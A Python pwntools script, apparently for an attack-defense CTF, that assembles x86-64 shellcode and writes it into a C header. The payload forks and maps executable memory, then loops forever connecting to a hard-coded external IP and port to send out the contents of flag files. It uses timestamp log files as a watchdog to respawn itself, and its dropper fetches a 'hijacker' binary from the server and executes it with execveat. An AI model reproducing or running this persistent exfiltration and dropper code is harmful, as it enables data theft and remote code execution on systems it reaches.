from pwn import *
import pwnlib.shellcraft
from helpers import get_binary_from_server, what_do_I_want, debarasare, pushstr, popstr, readfile
from helpers import OPTION_FILE
context.arch = 'amd64'


HOST = "134.209.231.196"
PORT = 4444
LOG  = "/tmp/caca1"
LOG2 = "/tmp/caca2"
INVOKER = "/tmp/idx"

def get_vars():
    global LOG, LOG2, INVOKER, OPTION_FILE
    f = open("/home/mcsky/Desktop/AD/mcAD/s1mz/santinela/env.h", "r")
    for line in f:
        if "LOG1" in line:
            LOG = line.split(" ")[2].strip().replace("\"", "")
        if "LOG2" in line:
            LOG2 = line.split(" ")[2].strip().replace("\"", "")
        if "IDX_DIR" in line:
            INVOKER = line.split(" ")[2].strip().replace("\"", "")
        if "OP_DIR" in line:
            OPTION_FILE = line.split(" ")[2].strip().replace("\"", "")
    f.close()
    print(f"LOG: {LOG}")
    print(f"LOG2: {LOG2}")
    print(f"INVOKER: {INVOKER}")
    print(f"OPTION_FILE: {OPTION_FILE}")

get_vars()

flags = ["/tmp/flag3.txt", "/tmp/flag4.txt"]
file_sc = []

for flag in flags:
    aux = readfile(flag)
    file_sc.append(aux)


get_time = '''/* call time(NULL) */
    mov rax, 201
    mov rdi, 0
    syscall
'''

open_log_file  = pushstr(LOG)
open_log_file += f'''/* call open('LOG', 'O_CREAT | O_RDWR', 0666) */
    mov rdi, rsp
    mov rsi, 0x42
    mov rdx, 0666
    mov rax, 2
    syscall
    mov r10, rax
    {popstr(LOG)}

'''
open_backup_file  = pushstr(LOG2)
open_backup_file += f'''/* call open('LOG', 'O_CREAT | O_RDWR', 0666) */
    mov rdi, rsp
    mov rsi, 0x42
    mov rdx, 0666
    mov rax, 2
    syscall
    mov r10, rax
    {popstr(LOG2)}

'''

open_log_file_2 = pushstr(LOG)
open_log_file_2 += f'''/* call open('LOG', 'O_CREAT | O_RDWR | O_TRUNC', 0666) */
    mov rdi, rsp
    mov rsi, 0x242
    mov rdx, 0666
    mov rax, 2
    syscall
    mov r10, rax
    {popstr(LOG)}
'''

open_backup_file_2 = pushstr(LOG2)
open_backup_file_2 += f'''/* call open('LOG2', 'O_CREAT | O_RDWR | O_TRUNC', 0666) */
    mov rdi, rsp
    mov rsi, 0x242
    mov rdx, 0666
    mov rax, 2
    syscall
    mov r10, rax
    {popstr(LOG2)}

'''

write_time_to_file = f'''
{open_log_file_2}
{get_time}
    /* call write('r10', 'rax', 8) */
    mov rdi, r10
    push rax
    mov rsi, rsp
    mov rdx, 8
    mov rax, 1
    syscall
    pop rsi

    /* call close('rbp') */
    mov rax, 3
    mov rdi, r10
    syscall
'''

write_time_to_backup_file = f'''{open_backup_file_2}
{get_time}
    /* call write('r10', 'rax', 8) */
    mov rdi, r10
    push rax
    mov rsi, rsp
    mov rdx, 8
    mov rax, 1
    syscall
    pop rsi

    /* call close('rbp') */
    mov rax, 3
    mov rdi, r10
    syscall
'''

check_time_in_file = f''' /* call READ('r10', 'rsp', 8) */
    push 0
    mov rdi, r10
    mov rsi, rsp
    mov rdx, 8
    mov rax, 0
    syscall

    /* close file */
    mov rax, 3
    mov rdi, r10
    syscall

    {get_time}

    /* compare time */
    pop r9
    sub rax, r9

    /* compute absolute value of rax */
    mov r9, rax
    sar r9, 63
    xor rax, r9
    sub rax, r9

    /* maybe increase this to 15 */
    cmp rax, 15
    pop rax
    jg spawn_proc_0
    {write_time_to_backup_file}
    {shellcraft.amd64.linux.sleep(5)}
    pop rax
    jmp child
'''

write_invoker = f'''{pushstr(INVOKER)}
    /* call open('INVOKER', 'O_CREAT | O_RDWR | O_TRUNC', 0666) */
    mov rdi, rsp
    mov rsi, 0x242
    mov rdx, 0666
    mov rax, 2
    syscall
    mov r10, rax

    {popstr(INVOKER)}
    /* 
'''

dropper = '''/* fork so we can execveat */
    mov rax, 57
    syscall

    cmp rax, 0
    jne debarasare'''
dropper += f'''{write_time_to_file}
    {write_time_to_backup_file}
    {get_binary_from_server("hijacker")}

    /* call execveat('rbp', 'rsp') */
    mov qword ptr [rsp], 0
    mov rdi, rbp
    mov rsi, rsp
    xor rdx, rdx
    xor r10, r10
    mov r8, 0x1000
    mov rax, 322
    syscall

    /* cause a sigsegv */
    mov rax, 0
    mov rax, [rax]

    pop rax
'''

check_backup = f''' /* call READ('r10', 'rsp', 8) */
    push 0
    mov rdi, r10
    mov rsi, rsp
    mov rdx, 8
    mov rax, 0
    syscall

    /* close file */
    mov rax, 3
    mov rdi, r10
    syscall

    {get_time}

    /* compare time */
    pop r9
    sub rax, r9

    /* compute absolute value of rax */ 
    mov r9, rax
    sar r9, 63
    xor rax, r9
    sub rax, r9

    cmp rax, 15
    pop rax

    jg spawn_proc_1

'''

child = f'''
    {open_log_file}
    {check_time_in_file}
child2:
    {shellcraft.amd64.linux.connect(HOST, PORT, )}
    pop rsi

    /* Check if connect was successful */
    cmp rax, 0
    jl skip_sending
'''

child += "\n".join(file_sc)

child += "\n"
child += f'''/* close socket */
mov rax, 3
mov rdi, rbp
syscall
skip_sending:
{write_time_to_file}
'''
child += shellcraft.amd64.linux.sleep(5)
child += '''pop rax
'''
child += "\n"
child += open_backup_file
child += check_backup

error = '''/* close socket */
mov rax, 3
mov rdi, rbp
syscall

jmp child
'''


payload = f'''
/* call fork */
mov rax, 0x39
syscall

/* check if we are the child */
cmp rax, 0
je init
int3

init:
    /* call mmap(0, 0xb000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0) */
    xor rdi, rdi
    mov rsi, 0xb000
    mov rdx, 7
    mov r10, 34
    mov r8, -1
    xor r9, r9
    mov rax, 9
    syscall
    jmp child

child:
/* create an infinite loop that constantly sends the file */
{child}
jmp child2

error:
{error}

debarasare:
{debarasare}
jmp child2

spawn_proc_0:
{what_do_I_want(0)}
jmp drop

spawn_proc_1:
{what_do_I_want(1)}
jmp drop

drop:
{dropper}
jmp child2

'''

# print(payload)
# exit()

aux = asm(payload)
# aux += asm("int3")
aux += b"\x90" * (8 - len(aux) % 8)

f = open("/home/mcsky/Desktop/AD/mcAD/s1mz/santinela/hijacker/shellcode.h", "w")
f.write("char *shellcode = \"")

for i in range(0, len(aux)):
    f.write("\\x%02x" % aux[i])

f.write("\";\n\n")
f.write(f"int shellcode_len = {len(aux)};\n")
print()
print(f"Payload length: {len(aux)}")